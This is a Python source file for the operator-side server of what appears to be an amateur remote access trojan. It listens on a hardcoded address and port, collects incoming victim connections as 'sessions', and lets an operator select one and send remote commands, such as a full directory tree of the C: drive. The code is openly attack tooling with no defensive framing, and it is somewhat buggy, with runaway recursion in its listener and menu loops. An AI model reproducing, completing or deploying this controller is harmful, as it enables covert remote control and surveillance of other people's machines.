import threading
import socket as s
from time import sleep

# constant ports:
# by default your localport(change if neaded)
HOST = "25.46.215.107"
# change port to your need:
PORT = 420
# -------------don't change anything from here if you don't know what you are doing-------------
BUFFER = 1024
ADDR = (HOST, PORT)
FORMAT = "cp850"
DISCONNECT = "!dsc"

server = s.socket(s.AF_INET, s.SOCK_STREAM)
server.bind(ADDR)
# saves active sessions
sessions = {}
session_ids = []

COMMANDS = ["help", "sessions"]
SESSION_COMMANDS = ["help", "back", "tree"]


class Commands:
    def __init__(self):
        self.helpmsg = """
        help: shows this message
        back: gets deselects the session and gets you back to them main menu
        sessions: [-s {sesion id} session id to sellect a session] [-d {sesion id} to dellete a session]
        """

    # commands in the main menu
    def mainMenu(self, command, args=None):
        if command == "help":
            print(self.helpmsg)
        elif command == "sessions":
            # checks for arguments
            if not args:
                if len(sessions) == 0:
                    print("there are no active sessions")

                else:
                    for i in sessions.items():
                        print(f"id: {i[1]['id']}   name: {i[1]['name']}")
            # checks if there are to meny arguments
            elif len(args) > 2:
                print("too many arguments only one is allowed")
            # the select argument to select a session
            elif args[0] == "-s" and len(args) == 2:
                if args[1] in session_ids:
                    sessionId = args[1]
                    sessionInfo = sessions[sessionId]
                    # gets the connection info
                    connectionInfo = sessionInfo["connection"]
                    # changes to session menu
                    print(f"changed to {sessionInfo['name']}")
                    sessionInput(connectionInfo[0], connectionInfo[1], sessionInfo["name"], sessionId)

                else:
                    print("This id is not availible")
            # to dellete a session
            elif args[0] == "-d" and len(args) == 2:
                if args[1] in session_ids:
                    sessionInfo = sessions[args[1]]

                    # confirm if you really dellete the session
                    def confirmation():
                        confirm = input(f"are you sure you want to dellete {sessionInfo['name']}[y|n]")
                        if confirm == "y":
                            sessions.pop(args[1])
                            session_ids.pop(int(args[1]))
                            print(f"delleted {sessionInfo['name']}")
                        elif confirm == "n":
                            mainMenu()
                        else:
                            print("This is not a valid option")
                            confirmation()

                    confirmation()
            else:
                print("you need a  value after your argument!")

    # for commands if a session is sellected
    def session(self, name, conn, addr, message, args=None):
        # reveives the messages and passes them to the evaluation
        def receiveMessage():
            msg_length = conn.recv(BUFFER).decode(FORMAT)
            msg_length = int(msg_length)

            if msg_length:
                msg = conn.recv(msg_length).decode(FORMAT)
                return msg

        # sends the message
        def sendMessage(msg):
            # sends the message length
            message_length = str(len(msg)).encode(FORMAT)
            message_length += b" " * (BUFFER - len(message_length))
            conn.send(message_length)

            conn.send(msg.encode(FORMAT))
            returned = receiveMessage()
            print(returned)

        # gets you back to the main menu
        if message == "back":
            mainMenu()

        # prints the help message
        elif message == "help":
            print(self.helpmsg)

        # shows the entire dir tree
        elif message == "tree":
            sendMessage(f"c tree C:\\")


# gets the commands whenn session is sellected
def sessionInput(conn, addr, name, id):
    try:
        command = input(f"command({name}): ")
        commandLst = command.split(" ")

        if commandLst[0] in SESSION_COMMANDS:
            scom = Commands()
            if len(commandLst) > 1:
                scom.session(name, conn, addr, commandLst[0], commandLst[1:len(commandLst)])
            else:
                scom.session(name, conn, addr, commandLst[0])
            sessionInput(conn, addr, name, id)

        elif commandLst[0] in COMMANDS:
            print(f"{command} is only availible in the main menu!")
            sessionInput(conn, addr, name, id)

        else:
            sessionInput(conn, addr, name, id)
    except ConnectionResetError:
        sessions.pop(id)
        print("The client is no longer connected")


# to acces everything not related to a session
def mainMenu():
    command = input("Command:")

    # splits the command to filter out extra options
    commandLst = command.split(" ")

    # checks if the command exist
    if commandLst[0] in COMMANDS:
        com = Commands()
        if len(commandLst) > 1:
            com.mainMenu(commandLst[0], commandLst[1:len(commandLst)])
        else:
            com.mainMenu(commandLst[0])
        mainMenu()

    elif commandLst[0] in SESSION_COMMANDS:
        print(f"{command} is only availible if you have a session sellected!")
        mainMenu()

    else:
        print(f"'{command}' is not a known command use 'help' for more!")
        mainMenu()


def startListening():
    server.listen()
    while True:
        conn, addr = server.accept()
        id_num = len(sessions)
        sessions.update({str(id_num): {"id": f"{id_num}", "name": f"session{id_num}", "connection": (conn, addr), "pyinstall": False}})
        session_ids.append(str(id_num))
        print(f"[CONNECTION] New connection from {addr[0]}")
        startListening()


listening = threading.Thread(target=startListening)
menues = threading.Thread(target=mainMenu)

listening.start()
print(f"[SERVER] Server starten and now listening on {HOST}:{PORT}\n")
menues.start()
